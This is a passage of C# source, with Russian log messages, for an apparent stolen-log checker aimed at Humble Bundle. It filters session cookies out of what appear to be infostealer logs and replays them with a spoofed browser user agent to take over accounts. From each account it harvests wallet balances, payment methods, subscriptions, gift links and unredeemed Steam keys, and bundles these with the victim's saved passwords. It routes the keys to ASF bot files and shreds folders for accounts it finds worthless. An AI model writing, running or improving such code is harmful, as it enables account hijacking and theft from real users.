                                        case "EARTH DEFENSE FORCE 4.1 The Shadow of New Despair":
                                            AppID = 410320;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Mission Pack 1: Time of the Mutants":
                                            AppID = 81803;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Mission Pack 2: Extreme Battle":
                                            AppID = 82022;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Ifrit":
                                            AppID = 101703;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Blood Storm":
                                            AppID = 101706;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Gleipnir":
                                            AppID = 101709;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Spark Lancer":
                                            AppID = 101712;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: BM03 Vegalta Gold":
                                            AppID = 101715;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Gigantus Tank, Bullet Girls Marking":
                                            AppID = 101718;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Gigantus Tank, EDF IFPS Markings":
                                            AppID = 101721;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Gigantus Tank, Natsuiro HS Markings":
                                            AppID = 101727;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Reflectron Laser":
                                            AppID = 105023;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Sting Shot":
                                            AppID = 105026;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Volatile Napalm":
                                            AppID = 105029;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Pure Decoy Launcher 5 Pack A":
                                            AppID = 105032;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Depth Crawler Gold Coat":
                                            AppID = 105038;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Gigantus DCC-Zero Marking":
                                            AppID = 105041;

                                            break;
                                        case "EARTH DEFENSE FORCE 4.1: Gigantus DCC-Gogo. Marking":
                                            AppID = 105044;

                                            break;
                                    }
                                }
                                else
                                {

                                    if (uint.TryParse(value, out uint AppID) && AppID > 0)
                                    {
                                        this.AppID = AppID;
                                    }
                                }
                            }
                        }

                        [JsonProperty("human_name")]
                        public string Name { get; set; }

                        [JsonProperty("is_expired")]
                        public bool Expired { get; set; }
                    }

                    [JsonProperty("all_tpks")]
                    public List<IAll> All { get; set; }

                    public bool ShouldSerializeAll() => All != null && All.Count > 0;
                }

                [JsonProperty("tpkd_dict")]
                public IDict Dict { get; set; }

                public bool ShouldSerializeDict() => Dict != null;

                #endregion

                #region Choice

                [JsonProperty("total_choices")]
                public int Count { get; set; }

                [JsonProperty("choices_remaining")]
                public int Choice { get; set; }

                #endregion
            }

            [JsonIgnore]
            public List<IOrder> OrderList { get; set; }

            public bool ShouldSerializeOrderList() => OrderList != null && OrderList.Count > 0;

            #endregion

            #region Key

            public class IKeyList
            {
                public enum EType : byte
                {
                    GIFT,
                    BUNDLE,
                    CHOICE
                }

                public enum EChoice : byte
                {
                    V1,
                    V2,
                    V3
                }

                public class IAny
                {
                    public string Value { get; set; }
                    public EType Type { get; set; }
                    public EChoice Choice { get; set; }
                }

                public List<IAny> AnyList { get; set; }
                public List<string> List { get; set; }
                public List<IOrder.IDict.IAll> DictList { get; set; }

                public IKeyList()
                {
                    AnyList = new List<IAny>();
                    List = new List<string>();
                    DictList = new List<IOrder.IDict.IAll>();
                }

                public void Add(IOrder Order)
                {
                    try
                    {
                        AnyList.Add(new IAny
                        {
                            Value = $"{(Order.Choice > 0 ? $"{Order.Choice} - " : "")}{(string.IsNullOrEmpty(Order.Product.URL) ? $"https://www.humblebundle.com/downloads?key={Order.GameKey}" : $"https://www.humblebundle.com/membership/{Order.Product.URL}")}",
                            Type = EType.CHOICE,
                            Choice = Order.Product.V3 ? EChoice.V3
                                   : Order.Product.V2 ? EChoice.V2
                                   : EChoice.V1
                        });
                    }
                    catch (Exception e)
                    {
                        Logger.LogGenericWarning($"ORDER <- {JsonConvert.SerializeObject(Order, Formatting.Indented)}");
                        Logger.LogGenericException(e);
                    }
                }

                public void Add(IOrder.IDict.IAll Dict)
                {
                    try
                    {
                        string Type = Dict.Type.TrimStart().TrimEnd().ToUpper();

                        string DirectoryValue = Auto.Type.Value == IAuto.EType.History
                            ? Path.Combine("Humble Bundle (History)", "NEW")
                            : "Humble Bundle";

                        Type = Combine(Auto.Config.Log, DirectoryValue, "_", Type);

                        if (string.IsNullOrEmpty(Dict.Key))
                        {
                            AnyList.Add(new IAny
                            {
                                Value = $"https://www.humblebundle.com/downloads?key={Dict.GameKey}",
                                Type = EType.BUNDLE
                            });
                        }
                        else
                        {
                            if (new string[] {
                                "YOU SENT THIS GIFT",
                                "REDEEMED TO"
                            }.Any(x => Dict.Key.ToUpper().Contains(x))) return;

                            if (Dict.Key.Contains("gift?key="))
                            {
                                lock (Lock)
                                {
                                    File.AppendAllText(
                                        Path.Combine(Type, "GIFT LIST.txt"),
                                        $"{Dict.Key}\n");
                                }

                                AnyList.Add(new IAny
                                {
                                    Value = Dict.Key,
                                    Type = EType.GIFT
                                });
                            }
                            else if (Dict.Type.ToUpper() == "STEAM")
                            {
                                string Stack = $"{Dict.Name}\t{Dict.Key}\n";

                                if (Auto.Config.WhiteList.Any(AppID => AppID == Dict.AppID))
                                {
                                    lock (Lock)
                                    {
                                        File.AppendAllText(Path.Combine(Type, "WHITE LIST.txt"), Stack);
                                    }
                                }
                                else
                                {
                                    string FileValue = null;

                                    if (Auto.Config.MasterList.Count == 0)
                                    {
                                        FileValue = Path.Combine(Type, "KEY LIST.txt");
                                    }
                                    else
                                    {
                                        string Bot = Auto.Config.MasterList
                                                .Where(x => !x.Value.Any(AppID => AppID == Dict.AppID))
                                                .Select(x => x.Key)
                                                .FirstOrDefault();

                                        if (string.IsNullOrEmpty(Bot))
                                        {
                                            FileValue = Path.Combine(Type, "BLACK LIST.txt");
                                        }
                                        else
                                        {
                                            FileValue = Path.Combine(Combine(Type, "ASF"), $"{Bot}.keys");
                                        }
                                    }

                                    lock (Lock)
                                    {
                                        File.AppendAllText(FileValue, Stack);
                                    }
                                }

                                List.Add(Dict.Key);
                            }
                            else
                            {
                                if (Dict.Instruction.Any(x => x.EndsWith("360008549494"))) // https://support.humblebundle.com/hc/en-us/articles/360008549494
                                {
                                    Type = Combine(Auto.Config.Log, DirectoryValue, "_", "UNITY ASSET VOUCHER");
                                }

                                lock (Lock)
                                {
                                    File.AppendAllText(
                                        Path.Combine(Type, "LIST.txt"),
                                        $"{Dict.Key}{(string.IsNullOrEmpty(Dict.Name) ? "" : $" - {Dict.Name}")}{(Dict.Instruction != null && Dict.Instruction.Count > 0 ? $" | {string.Join(", ", Dict.Instruction)}" : "")}\n");
                                }

                                DictList.Add(Dict);
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        Logger.LogGenericWarning($"DICT <- {JsonConvert.SerializeObject(Dict, Formatting.Indented)}");
                        Logger.LogGenericException(e);
                    }
                }

                public List<string> Exempt()
                {
                    var Content = new List<string>();

                    if (AnyList != null && AnyList.Count > 0)
                    {
                        #region GIFT | BUNDLE

                        var AnyBy = AnyList
                            .Where(x => x.Type == EType.GIFT || x.Type == EType.BUNDLE)
                            .OrderBy(x => x.Type)
                            .GroupBy(x => x.Type)
                            .Select(x => (
                                Type: x.Key,
                                List: x.Select(v => v.Value).ToList()
                            ))
                            .ToList();

                        if (AnyBy.Count > 0)
                        {
                            Auto.Summary.G += AnyList.Count(x => x.Type == EType.GIFT);
                            Auto.Summary.B += AnyList.Count(x => x.Type == EType.BUNDLE);

                            foreach ((EType Type, List<string> List) in AnyBy)
                            {
                                Content.Add($"\n{Type} VALUES: ({List.Count}):");

                                var GroupBy = List
                                    .GroupBy(x => x)
                                    .Select(x => (
                                        x.Key,
                                        Count: x.Count()
                                    ))
                                    .OrderBy(x => x.Count)
                                    .Reverse()
                                    .ToList();

                                Content.AddRange(GroupBy.Select(x => $"{x.Key}{(x.Count > 1 ? $" ({x.Count})" : "")}"));
                            }
                        }

                        #endregion

                        #region CHOICE

                        var ChoiceBy = AnyList
                            .Where(x => x.Type == EType.CHOICE)
                            .OrderBy(x => x.Choice == EChoice.V3)
                            .GroupBy(x => x.Choice)
                            .Select(x => (
                                Type: x.Key,
                                List: x.Select(v => v.Value).ToList()
                            ))
                            .ToList();

                        if (ChoiceBy.Count > 0)
                        {
                            Auto.Summary.C += AnyList.Count(x => x.Type == EType.CHOICE);

                            foreach ((EChoice Choice, List<string> List) in ChoiceBy)
                            {
                                Content.Add($"\nCHOICE {Choice} VALUES ({List.Count}):");

                                var GroupBy = List
                                    .GroupBy(x => x)
                                    .Select(x => (
                                        x.Key,
                                        Count: x.Count()
                                    ))
                                    .OrderBy(x => x.Count)
                                    .Reverse()
                                    .ToList();

                                Content.AddRange(GroupBy.Select(x => $"{x.Key}{(x.Count > 1 ? $" ({x.Count})" : "")}"));
                            }
                        }

                        #endregion
                    }

                    if (List != null & List.Count > 0)
                    {
                        List = List
                            .Distinct()
                            .ToList();

                        Auto.Summary.K += List.Count;

                        Content.Add($"\nSTEAM KEYS ({List.Count}):");
                        Content.Add(string.Join(", ", List));
                    }

                    if (DictList != null && DictList.Count > 0)
                    {
                        var GroupBy = DictList
                            .OrderBy(x => x.Type)
                            .GroupBy(x => x.Type)
                            .Select(x => (
                                Type: x.Key,
                                Keys: x.Select(v => v.Key).ToList()
                            ))
                            .ToList();

                        if (GroupBy.Count > 0)
                        {
                            foreach (var Group in GroupBy)
                            {
                                Content.Add($"\n{Group.Type.ToUpper()} ({Group.Keys.Count}):");
                                Content.Add(string.Join(", ", Group.Keys));
                            }
                        }
                    }

                    return Content;
                }
            }

            #endregion

            #region Exchange

            [JsonProperty("exchange")]
            public Dictionary<string, double> Exchange { get; set; }

            public static (double USD, double RUB) Convert(Dictionary<string, double> Exchange, IUser.IMoney Money)
            {
                double USD = 0d;
                double RUB = 0d;

                bool Default = false;

                if (Money.Currency == "USD")
                {
                    Default = true;
                }
                else
                {
                    if (Exchange.ContainsKey(Money.Currency))
                    {
                        USD = Money.Amount / Exchange[Money.Currency]; // USD
                    }
                }

                if (Money.Currency == "RUB")
                {

                }
                else
                {
                    if (Exchange.ContainsKey("RUB"))
                    {
                        RUB = (Default ? Money.Amount : USD) * Exchange["RUB"]; // RUB
                    }
                }

                return (USD, RUB);
            }

            public bool ShouldSerializeExchange() => Exchange != null && Exchange.Count > 0;

            #endregion
        }

        private void T(string EMail, ILog.ICookie List, Logger Logger, IHumbleBundleResponse Response = null, string Issue = null, bool Write = true)
        {
            try
            {
                string _Directory = Combine(EMail, "!");

                try
                {
                    if (Write)
                    {
                        if (!File.Exists(Path.Combine(_Directory, "!.txt")) &&
                            !File.Exists(Path.Combine(_Directory, "!.json")))
                        {
                            lock (Lock)
                            {
                                File.WriteAllText(Path.Combine(EMail, "~"), DateTime.UtcNow.ToString());
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Logger.LogGenericException(e);
                }

                if (Write)
                {
                    lock (Lock)
                    {
                        File.WriteAllText(
                             Path.Combine(_Directory, "!.txt"),
                            $"{List.Domain}\t{List.HttpOnly?.ToString(CultureInfo.InvariantCulture).ToUpper() ?? "FALSE"}\t{List.Path}\t{List.Secure?.ToString(CultureInfo.InvariantCulture).ToUpper() ?? "FALSE"}\t{List.ExpirationDate}\t{List.Name}\t{List.Value}");
                    }
                }

                string _File = Path.Combine(_Directory, "!.json");

                try
                {
                    if (File.Exists(_File))
                    {
                        var RESPONSE = JsonConvert.DeserializeObject<IHumbleBundleResponse>(File.ReadAllText(_File));

                        if (Write)
                        {
                            if (Response.User.Difference(Logger, RESPONSE.User))
                            {
                                string _DIRECTORY = Combine(_Directory, "_");
                                string _FILE = Path.Combine(_DIRECTORY, "_.json");

                                lock (Lock)
                                {
                                    File.WriteAllText(
                                        _FILE,
                                        JsonConvert.SerializeObject(RESPONSE, Formatting.Indented));
                                }
                            }
                        }
                        else
                        {
                            Logger.LogGenericDebug($"{Issue}: {JsonConvert.SerializeObject(new { LIST = List, RESPONSE }, Formatting.Indented)}");
                        }
                    }
                }
                catch (Exception e)
                {
                    Logger.LogGenericException(e);
                }

                if (Write)
                {
                    lock (Lock)
                    {
                        File.WriteAllText(
                            _File,
                            JsonConvert.SerializeObject(Response, Formatting.Indented));
                    }
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }
        }

        private async Task IHumbleBundle(ILog _, Logger Logger)
        {
            try
            {
                _.Cookie.ForEach(v => v.List.RemoveAll(x => !x.Name.ToUpper().Contains("_SIMPLEAUTH_SESS")));

                foreach (var Cookie in _.Cookie)
                {
                    foreach (var List in Cookie.List)
                    {
                        var Client = new RestClient(
                            new RestClientOptions()
                            {
                                UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
                                MaxTimeout = 300000
                            });

                        var Request = new RestRequest("https://www.humblebundle.com/user/settings");

                        try
                        {
                            Client.AddCookie(List.Name, List.Value, List.Path, List.Domain);
                        }
                        catch { }

                        try
                        {
                            for (byte i = 0; i < 10; i++)
                            {
                                var Source = new CancellationTokenSource();
                                Source.CancelAfter(300000);

                                try
                                {
                                    var Execute = await Client.ExecuteGetAsync(Request, Source.Token);

                                    if ((int)Execute.StatusCode == 429)
                                    {
                                        Logger.LogGenericWarning("Слишком много запросов!");

                                        await Task.Delay(TimeSpan.FromMinutes(2.5), Source.Token);

                                        continue;
                                    }

                                    if (string.IsNullOrEmpty(Execute.Content))
                                    {
                                        if (Execute.StatusCode == 0 || Execute.StatusCode == HttpStatusCode.OK)
                                        {
                                            Logger.LogGenericWarning("Ответ пуст!");

                                            await Task.Delay(TimeSpan.FromMinutes(1));

                                            continue;
                                        }
                                        else
                                        {
                                            Logger.LogGenericWarning($"Ошибка: {Execute.StatusCode}.");
                                        }
                                    }
                                    else
                                    {
                                        if (Execute.StatusCode == 0 || Execute.StatusCode == HttpStatusCode.OK)
                                        {
                                            string UserValue = GetSplitValue(Execute.Content, new ISplit
                                            {
                                                Start = "<script id=\"webpack-user-settings-data\" type=\"application/json\">",
                                                StartValue = 1,
                                                End = "</script>",
                                                EndValue = 0
                                            });

                                            if (string.IsNullOrEmpty(UserValue))
                                            {
                                                if (Auto.Type.Value == IAuto.EType.History)
                                                {
                                                    T(_.DirectoryValue, List, Logger, Issue: $"string.IsNullOrEmpty({nameof(UserValue)}) == TRUE", Write: false);

                                                    Helper.Shredder(new DirectoryInfo(_.DirectoryValue));
                                                }

                                                break;
                                            }

                                            if (Logger.Helper.IsValidJson(UserValue))
                                            {
                                                try
                                                {
                                                    var JSON = JsonConvert.DeserializeObject<IHumbleBundleResponse.IUser>(UserValue);

                                                    if (JSON == null)
                                                    {
                                                        Logger.LogGenericWarning($"Ошибка: {Execute.Content}.");
                                                    }
                                                    else
                                                    {
                                                        var Response = new IHumbleBundleResponse
                                                        {
                                                            User = JSON
                                                        };

                                                        if (Response.User == null ||
                                                            Response.User.Default == null || string.IsNullOrEmpty(Response.User.Default.EMail))
                                                        {
                                                            if (Auto.Type.Value == IAuto.EType.History)
                                                            {
                                                                T(_.DirectoryValue, List, Logger, Issue: $"{nameof(Response.User)} == {Response.User == null} || {nameof(Response.User.Default)} == {Response.User.Default == null} || string.IsNullOrEmpty({nameof(Response.User.Default.EMail)}) == {string.IsNullOrEmpty(Response.User.Default.EMail)}", Write: false);

                                                                Helper.Shredder(new DirectoryInfo(_.DirectoryValue));
                                                            }

                                                            break;
                                                        }

                                                        Response.User.Wallet = new IHumbleBundleResponse.IUser.IMoney
                                                        {
                                                            Amount = Response.User.WalletBalance,
                                                            Currency = Response.User.WalletCurrency
                                                        };

                                                        Response.User.Subscription.JoinDate = Response.User.JoinDate;
                                                        Response.User.Subscription.ExpiryDate = Response.User.ExpiryDate;

                                                        Response = IHumbleBundleSubscription(Response, Logger, Execute.Content);
                                                        Response = IHumbleBundleExchange(Response, Logger, Execute.Content);

                                                        await Task.Delay(1000);
                                                        Response = await IHumbleBundleUser(Response, List, Logger);

                                                        try
                                                        {
                                                            if (Response.User.Subscription.Code == 0 && Response.User.Wallet.Amount == 0d)
                                                            {
                                                                if (Auto.Type.Value == IAuto.EType.History)
                                                                {
                                                                    T(_.DirectoryValue, List, Logger, Issue: $"{nameof(Response.User.Subscription.Code)} == 0 && {nameof(Response.User.Wallet.Amount)} == 0d", Write: false);

                                                                    Helper.Shredder(new DirectoryInfo(_.DirectoryValue));
                                                                }
                                                            }
                                                            else
                                                            {
                                                                T(Path.Combine(Auto.Config.Log, "Humble Bundle (History)", "SAVE", Response.User.Default.EMail), List, Logger, Response);
                                                            }
                                                        }
                                                        catch (Exception e)
                                                        {
                                                            Logger.LogGenericException(e);
                                                        }

                                                        bool Continue = false;

                                                        try
                                                        {
                                                            if (Auto.Config.Checked.Any(x => x.EMail == Response.User.Default.EMail))
                                                            {
                                                                if (Response.ShouldSerializeGameKeyList())
                                                                {
                                                                    var Comparison = Auto.Config.Checked.FirstOrDefault(x => x.EMail == Response.User.Default.EMail);

                                                                    if (Comparison.GameKeyList.Count < Response.GameKeyList.Count)
                                                                    {
                                                                        var X = Response.GameKeyList
                                                                            .Except(Comparison.GameKeyList)
                                                                            .ToList();

                                                                        Logger.LogGenericObject(new
                                                                        {
                                                                            Response = Response.GameKeyList,
                                                                            Comparison = Comparison.GameKeyList,
                                                                            Except = X
                                                                        });

                                                                        lock (Lock)
                                                                        {
                                                                            Comparison.Date = DateTime.UtcNow;
                                                                            Comparison.GameKeyList = Response.GameKeyList;

                                                                            Auto.Config.Save();
                                                                        }

                                                                        Response.GameKeyList = X;
                                                                    }
                                                                    else
                                                                    {
                                                                        Continue = true;
                                                                    }
                                                                }
                                                                else
                                                                {
                                                                    Continue = true;
                                                                }
                                                            }
                                                            else
                                                            {
                                                                lock (Lock)
                                                                {
                                                                    File.AppendAllText(
                                                                        BinFile,
                                                                        $"{List.Domain}\t{List.HttpOnly?.ToString(CultureInfo.InvariantCulture).ToUpper() ?? "FALSE"}\t{List.Path}\t{List.Secure?.ToString(CultureInfo.InvariantCulture).ToUpper() ?? "FALSE"}\t{List.ExpirationDate}\t{List.Name}\t{List.Value}\n");

                                                                    Auto.Config.Checked.Add(new IConfig.IChecked(
                                                                        Response.User.Default.EMail,
                                                                        DateTime.UtcNow,
                                                                        Response.GameKeyList
                                                                    ));

                                                                    Auto.Config.Save();
                                                                }
                                                            }
                                                        }
                                                        catch (Exception e)
                                                        {
                                                            Logger.LogGenericException(e);
                                                        }

                                                        Logger.LogGenericDebug($"RESPONSE <- {(Response.ShouldSerializeGameKeyList() ? Response.GameKeyList.Count.ToString() : "NULL")} ({Continue.ToString().ToUpper()}): {JsonConvert.SerializeObject(Response)}");

                                                        if (Continue)
                                                        {
                                                            if (!(Response.User.Subscription.Code == 3 && Response.User.Subscription.MonthlyContent.Active))
                                                            {
                                                                break;
                                                            }
                                                        }
                                                        else
                                                        {
                                                            if (Response.ShouldSerializeGameKeyList())
                                                            {
                                                                await Task.Delay(1000);

                                                                Response = await IHumbleBundleOrder(Response, List, Logger);
                                                            }
                                                        }

                                                        Response.Date.Updated = DateTime.UtcNow;

                                                        var Cluster = new List<string>
                                                        {
                                                            $"CREATED: {Response.User.Default.Created.ToString("yyyy-MM-dd hh-mm-ss tt", CultureInfo.InvariantCulture)}",
                                                            $"E-MAIL: {(string.IsNullOrEmpty(Response.User.Default.EMail) ? "EMPTY" : Response.User.Default.EMail)}"
                                                        };

                                                        var FileNameCluster = new List<string>();

                                                        if (Response.User.Default.ShouldSerializeHasAdminAccess())
                                                        {
                                                            FileNameCluster.Add("ADMIN");
                                                        }

                                                        if (Response.User.Wallet.Amount > 0d)
                                                        {
                                                            FileNameCluster.Add("WALLET");

                                                            if (Response.Exchange == null)
                                                            {
                                                                Cluster.Add($"WALLET: {Response.User.Wallet}");
                                                            }
                                                            else
                                                            {
                                                                Cluster.Add("\nWALLET:");
                                                                Cluster.Add($"{Response.User.Wallet.Currency}: {Response.User.Wallet.Amount}");

                                                                var (USD, RUB) = IHumbleBundleResponse.Convert(Response.Exchange, Response.User.Wallet);

                                                                if (USD > 0)
                                                                    Cluster.Add($"USD: ~{USD}");

                                                                if (RUB > 0)
                                                                    Cluster.Add($"RUB: ~{RUB}");
                                                            }
                                                        }

                                                        if (Response.User.Subscription.Code > 0)
                                                        {
                                                            FileNameCluster.Add("SUBSCRIPTION");

                                                            Cluster.Add("\nSUBSCRIPTION:");

                                                            if (Response.User.Subscription.ShouldSerializeJoinDate())
                                                            {
                                                                Cluster.Add($"JOIN DATE: {Response.User.Subscription.JoinDate}");
                                                            }

                                                            Cluster.AddRange(new string[]
                                                            {
                                                                $"STATUS: {Response.User.Subscription.Status}",
                                                                $"BILLING DATE: {Response.User.Subscription.NextBillingDate:yyyy-MM-dd}"
                                                            });

                                                            if (Response.User.Subscription.ShouldSerializeExpiryDate())
                                                            {
                                                                Cluster.Add($"EXPIRY DATE: {Response.User.Subscription.ExpiryDate:yyyy-MM-dd}");
                                                            }

                                                            if (Response.User.Subscription.ShouldSerializeName())
                                                            {
                                                                if (Response.Exchange == null)
                                                                {
                                                                    Cluster.Add($"\nPLAN ({Response.User.Subscription.Name}):");

                                                                    if (Response.User.Subscription.ShouldSerializeMoney())
                                                                    {
                                                                        Cluster.Add($"COST: {Response.User.Subscription.Money}");
                                                                    }
                                                                }
                                                                else
                                                                {
                                                                    Cluster.Add($"\nPLAN ({Response.User.Subscription.Name}):");

                                                                    Cluster.Add($"COST:");
                                                                    Cluster.Add($"{Response.User.Subscription.Money.Currency}: {Response.User.Subscription.Money.Amount}");

                                                                    var (USD, RUB) = IHumbleBundleResponse.Convert(Response.Exchange, Response.User.Subscription.Money);

                                                                    if (USD > 0d)
                                                                        Cluster.Add($"USD: ~{USD}");

                                                                    if (RUB > 0d)
                                                                        Cluster.Add($"RUB: ~{RUB}");
                                                                }
                                                            }

                                                            if (Response.User.Subscription.Pause.Enabled)
                                                            {
                                                                Cluster.Add("\nPAUSE:");
                                                                Cluster.AddRange(new string[]
                                                                {
                                                                    $"LAST SKIPPED: {Response.User.Subscription.Pause.LastSkipped.ToUpper()}",
                                                                    $"RESUME DATE: {Response.User.Subscription.Pause.ResumeDate:yyyy-MM-dd}"
                                                                });
                                                            }

                                                            Cluster.Add("\nMONTHLY:");
                                                            Cluster.AddRange(new string[]
                                                            {
                                                                $"ACTIVE: {Response.User.Subscription.MonthlyContent.Active.ToString().ToUpper()}",
                                                                $"NAME: {Response.User.Subscription.MonthlyContent.Name.ToUpper()}",
                                                                $"END DATE: {Response.User.Subscription.MonthlyContent.EndDate:yyyy-MM-dd}"
                                                            });

                                                            if (Response.User.Subscription.MonthlyContent.ShouldSerializeActive())
                                                            {
                                                                FileNameCluster.Add("MONTHLY ACTIVE CONTENT");
                                                            }
                                                        }

                                                        Cluster.Add($"\nCOOKIE: {List.Value.TrimStart().TrimEnd()}");
                                                        Cluster.Add($"FILE PATH: {Cookie.FileValue}");

                                                        if (Response.User.Default.ShouldSerializePayment())
                                                        {
                                                            FileNameCluster.Add("PAYMENT");

                                                            Cluster.Add($"\nPAYMENT LIST:");
                                                            Cluster.Add(string.Join("\n", Response.User.Default.Payment
                                                                .OrderBy(x => x.Type)
                                                                .Select(x => x.ToString())
                                                                .Distinct()));
                                                        }

                                                        int Range = 0;

                                                        var KeyCluster = new IHumbleBundleResponse.IKeyList();

                                                        if (Response.ShouldSerializeOrderList())
                                                        {
                                                            FileNameCluster.Add("ORDER");

                                                            var OrderCluster = Response.OrderList
                                                                .Where(x => x.Product != null)
                                                                .ToList();

                                                            Range = OrderCluster.Count;

                                                            if (OrderCluster
                                                                .Where(x => x.ShouldSerializeDict() && x.Dict.ShouldSerializeAll())
                                                                .Count(x => x.Dict.All.Any(v => !v.Expired && string.IsNullOrEmpty(v.Key))) > 0)
                                                            {
                                                                FileNameCluster.Add("NOT CLAIMED");
                                                            }

                                                            if (OrderCluster.Any(x => x.Choice > 0 || x.Product.V3))
                                                            {
                                                                FileNameCluster.Add("CHOICE");
                                                            }

                                                            Cluster.Add($"\nORDER LIST ({Range}):");

                                                            var OrderList = OrderCluster
                                                                .OrderBy(x => x.Created)
                                                                .OrderBy(x => x.ShouldSerializeDict() && x.Dict.ShouldSerializeAll()
                                                                    ? x.Dict.All.Count
                                                                    : 0)
                                                                .Reverse()
                                                                .Select((x, v) => (List: x, Index: v + 1))
                                                                .ToList();

                                                            foreach ((IHumbleBundleResponse.IOrder Order, int Index) in OrderList)
                                                            {
                                                                var DictCluster = new List<string>
                                                                {
                                                                    $"{Order.Product.Name}{(Order.Count > 0 ? $" ({Order.Count})" : "")}{(Order.Choice > 0 ? $" | Choice: {Order.Choice}" : "")} | Spent: {Order.Spent} {Response.User.Wallet.Currency} | Created: {Order.Created.ToString("yyyy-MM-dd hh-mm-ss tt", CultureInfo.InvariantCulture)}"
                                                                };

                                                                bool DictValid = Order.ShouldSerializeDict() && Order.Dict.ShouldSerializeAll();

                                                                if (Order.Choice > 0 || Order.Product.V3)
                                                                {
                                                                    KeyCluster.Add(Order);
                                                                }

                                                                if (DictValid)
                                                                {
                                                                    foreach (var X in Order.Dict.All
                                                                        .OrderBy(x => string.IsNullOrEmpty(x.Key))
                                                                        .Reverse()
                                                                        .ToList())
                                                                    {
                                                                        DictCluster.Add($"{X.Name} ({X.Type.ToUpper()}) | Value: {(string.IsNullOrEmpty(X.Key) ? "Empty" : X.Key)} | Valid: " +
                                                                            (!X.Expired && string.IsNullOrEmpty(X.Key)
                                                                                ? $"TRUE"
                                                                                : $"[EXPIRED: {(X.Expired ? X.ExpiryDate : "FALSE")} | CLAIMED: {(string.IsNullOrEmpty(X.Key) ? "FALSE" : "TRUE")}]"));

                                                                        if (!X.Sold && !X.Expired)
                                                                        {
                                                                            KeyCluster.Add(X);
                                                                        }
                                                                    }
                                                                }

                                                                Cluster.Add(string.Concat(new string[]
                                                                {
                                                                    string.Join("\n", DictCluster),
                                                                    Index < OrderList.Count && DictCluster.Count > 1
                                                                        ? "\n"
                                                                        : ""
                                                                }));
                                                            }

                                                            var Exempt = KeyCluster.Exempt();

                                                            if (Exempt.Count > 0)
                                                            {
                                                                Cluster.AddRange(Exempt);

                                                                FileNameCluster.Add("CONTENT");
                                                            }
                                                        }

                                                        if (_.Password.Count > 0)
                                                        {
                                                            var PasswordList = GetPasswordList(_.Password);

                                                            if (PasswordList != null && PasswordList.Count > 0)
                                                            {
                                                                Cluster.Add($"\nPASSWORD LIST:");
                                                                Cluster.AddRange(PasswordList);

                                                                FileNameCluster.Add("PASSWORD");
                                                            }
                                                        }

                                                        string DirectoryValue = Auto.Type.Value == IAuto.EType.History
                                                            ? Path.Combine("Humble Bundle (History)", "NEW")
                                                            : "Humble Bundle";

                                                        await Append.File(
                                                            Logger,
                                                            Path.Combine(Auto.Config.Log, DirectoryValue, Append.Range(Range)),
                                                            $"{GetFileName(FileNameCluster)}.txt",
                                                            Append.Content(Cluster));

                                                        try
                                                        {
                                                            if (Response.ShouldSerializeOrderList())
                                                            {
                                                                await Append.File(
                                                                    Logger,
                                                                    DebugDirectory,
                                                                    $"{Response.User.Default.EMail}.json",
                                                                    JsonConvert.SerializeObject(Response.OrderList.Select(x => JsonConvert.DeserializeObject(x._)), Formatting.Indented));
                                                            }
                                                        }
                                                        catch (OperationCanceledException)
                                                        {
                                                            Logger.LogGenericDebug("Задача успешно отменена!");
                                                        }
                                                        catch (ObjectDisposedException) { }
                                                        catch (Exception e)
                                                        {
                                                            Logger.LogGenericException(e);
                                                        }
                                                    }

                                                    break;
                                                }
                                                catch (Exception e)
                                                {
                                                    Logger.LogGenericException(e);
                                                }
                                            }

                                        }
                                        else
                                        {
                                            Logger.LogGenericWarning($"Ошибка: {Execute.StatusCode}.");
                                        }
                                    }

                                    await Task.Delay(2500);
                                }
                                catch (OperationCanceledException)
                                {
                                    Logger.LogGenericDebug("Задача успешно отменена!");
                                }
                                catch (ObjectDisposedException) { }
                                catch (Exception e)
                                {
                                    Logger.LogGenericException(e);
                                }
                                finally
                                {
                                    Source.Dispose();
                                    Source = null;
                                }
                            }
                        }
                        catch (OperationCanceledException)
                        {
                            Logger.LogGenericDebug("Задача успешно отменена!");
                        }
                        catch (ObjectDisposedException) { }
                        catch (Exception e)
                        {
                            Logger.LogGenericException(e);
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }
        }

        #region Subscription

        public class ISubscription
        {
            [JsonProperty("perksStatus")]
            public string Status { get; set; }

            [JsonProperty("billDate")]
            public DateTime? NextBillingDate { get; set; }

            #region Monthly

            [JsonProperty("monthlyOwnsActiveContent")]
            public bool Active { get; set; }

            [JsonProperty("monthlyNewestOwnedContentMachineName")]
            public string Name { get; set; }

            [JsonProperty("monthlyNewestOwnedContentEnd")]
            public DateTime? EndDate { get; set; }

            #endregion

            #region Pause

            [JsonProperty("isPaused")]
            public bool Enabled { get; set; }

            [JsonProperty("lastSkippedContentMachineName")]
            public string LastSkipped { get; set; }

            [JsonProperty("unpauseDt")]
            public DateTime? ResumeDate { get; set; }

            #endregion
        }

        #endregion

        private IHumbleBundleResponse IHumbleBundleSubscription(IHumbleBundleResponse Response, Logger Logger, string Content)
        {
            try
            {
                string SubscriptionValue = GetSplitValue(Content, new ISplit
                {
                    Start = "window.models.userSubscriptionState = ",
                    StartValue = 1,
                    End = ";",
                    EndValue = 0
                });

                if (string.IsNullOrEmpty(SubscriptionValue))
                {
                    Logger.LogGenericWarning("Ответ пуст!");
                }
                else
                {
                    if (Logger.Helper.IsValidJson(SubscriptionValue))
